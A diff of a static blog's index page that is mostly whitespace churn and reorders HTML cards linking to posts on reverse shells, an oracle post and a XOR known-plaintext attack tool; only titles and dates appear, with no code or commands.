+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
            
           
            
@@ -1960,92 +2022,6 @@ root</code></pre></div></p>
            
            
            
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/oracle/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/oracle.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Ask and you shall receive</h3>
-      <h3 class="title" lang="el">Ζήτα και θα λάβεις</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">04 May 2019</time>
-      <time lang="el">04 Μαϊ 2019</time>
-    </footer>
-  </a>
-</article>
-
            
           
            
@@ -2273,6 +2249,78 @@ root</code></pre></div></p>
            
            
            
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/reverse_shells/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/shell.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Reverse shells</h3>
+      <h3 class="title" lang="el">Αντίστροφα κελύφη (reverse shells)</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">12 Apr 2018</time>
+      <time lang="el">12 Απρ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/oracle/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/oracle.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Ask and you shall receive</h3>
+      <h3 class="title" lang="el">Ζήτα και θα λάβεις</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">04 May 2019</time>
+      <time lang="el">04 Μαϊ 2019</time>
+    </footer>
+  </a>
+</article>
+
+           
           
            
            
@@ -2363,25 +2411,21 @@ root</code></pre></div></p>
            
            
            
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/xor_kpa/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/keylock.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Known-plaintext attack tool for XOR-encrypted data</h3>
+      <h3 class="title" lang="el">Εργαλείο επιθέσεων γνωστού αρχικού κειμένου έναντι XOR-κρυπτογραφημένων δεδομένων</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">22 Apr 2018</time>
+      <time lang="el">22 Απρ 2018</time>
+    </footer>
+  </a>
+</article>
+
            
           
            
